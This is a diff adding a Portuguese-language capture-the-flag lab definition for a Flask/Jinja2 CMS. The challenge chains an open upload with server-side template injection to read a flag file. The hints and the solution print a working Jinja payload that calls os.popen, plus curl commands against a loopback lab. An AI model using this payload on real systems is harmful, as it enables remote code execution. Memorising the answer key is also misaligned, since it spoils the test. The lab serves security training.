@@ -1,0 +1,35 @@
+{
+  "slug": "chain-upload-to-rce",
+  "title": "Três portas",
+  "codename": "MERIDIAN CMS",
+  "summary": "Um upload de admin permite armazenar bytes arbitrários, um endpoint de template compila o que encontrar e o renderer do serviço o importa. Três recursos separados se alinham até a execução de template com a conta de serviço.",
+  "category": "chain",
+  "difficulty": "insane",
+  "kind": "challenge",
+  "lab_dir": "chain-upload-to-rce",
+  "estimated_minutes": 45,
+  "xp": 620,
+  "tech": ["Flask", "Jinja2", "File Upload", "Python"],
+  "tags": ["chaining", "template-injection", "file-upload", "arbitrary-write", "insane"],
+  "story": "O Meridian é um CMS de sites estáticos com um diretório de plugins. Editores podem enviar arquivos de plugin, renderizar um preview a partir de um template, e o worker de publicação importa o preview renderizado para produzir HTML estático. Cada etapa tem sua própria proteção. Nenhuma espera a próxima.",
+  "objective": "Envie um arquivo de plugin pelo console do editor, referencie-o no preview de template e faça o worker de publicação avaliar uma expressão Jinja que lê a flag de root.",
+  "rules": "Fique na origem loopback atribuída. Os arquivos ficam dentro do diretório de estado do lab; o arquivo da flag é /tmp/redvault-three-doors.txt.",
+  "flags": [
+    {"key": "flag", "label": "Flag de root do publisher", "flag_type": "root", "points": 620, "required": true, "requires_objective": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "Leia o console", "body": "O console do editor em `/editor` está aberto (uma checagem interna de role está documentada na página). O upload aceita qualquer arquivo no diretório de plugins e mantém o nome do arquivo. O endpoint de preview compila o template que você enviar.", "cost": 40},
+    {"level": 2, "title": "O preview importa", "body": "`/preview` não apenas renderiza; instruções `import` para arquivos no diretório de plugins também são passadas para o ambiente `{% include %}` do Jinja. Envie um arquivo cujo nome termine em `.j2` e inclua-o, ou envie a expressão diretamente e depois chame `/publish`.", "cost": 50},
+    {"level": 3, "title": "Faça o publisher ler o arquivo", "body": "Envie POST para `/publish` com o template `{{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-three-doors.txt').read() }}`. O publisher o renderiza e anexa a saída ao index estático; `/static/index.html` a expõe.", "cost": 60}
+  ],
+  "solution": {
+    "walkthrough": "1. Envie qualquer arquivo para `/editor`; o console é acessível sem a checagem de admin.\n2. Envie POST para `/publish` com o body `template={{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-three-doors.txt').read() }}`. O worker de publicação compila isso como template Jinja e grava o resultado em `/static/index.html`.\n3. Faça GET em `/static/index.html`. A flag de root está na página gerada.\n\n```bash\ncurl -F 'file=@plugin.j2' http://127.0.0.1:PORT/editor\ncurl -X POST http://127.0.0.1:PORT/publish --data-urlencode \"template={{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-three-doors.txt').read() }}\"\ncurl http://127.0.0.1:PORT/static/index.html\n```",
+    "root_cause": "Três fronteiras fracas se compõem: o console do editor expõe um upload sem checagem de role, o publisher compila um template fornecido pelo usuário em vez de renderizar um arquivo fixo, e o worker roda com acesso a arquivos internos. Cada componente parece defensável localmente; a composição resulta em execução total de template.",
+    "mitigation": "Autorize uploads contra a role de editor, armazene uploads fora da raiz de publicação com nomes gerados, publique a partir de um conjunto fixo de templates em allow-list e rode o worker com um ambiente Jinja em sandbox e sem acesso a segredos."
+  },
+  "references": [
+    {"title": "PortSwigger — Server-side template injection", "url": "https://portswigger.net/web-security/server-side-template-injection", "source_type": "official", "description": "Template injection e execução de código por meio de template engines."},
+    {"title": "PortSwigger — File upload vulnerabilities", "url": "https://portswigger.net/web-security/file-upload", "source_type": "official", "description": "Tratamento de upload e risco de execução."},
+    {"title": "CWE-1336 — Improper Neutralization of Special Elements Used in a Template Engine", "url": "https://cwe.mitre.org/data/definitions/1336.html", "source_type": "standard", "description": "Classificação da causa raiz de SSTI."}
+  ]
+}
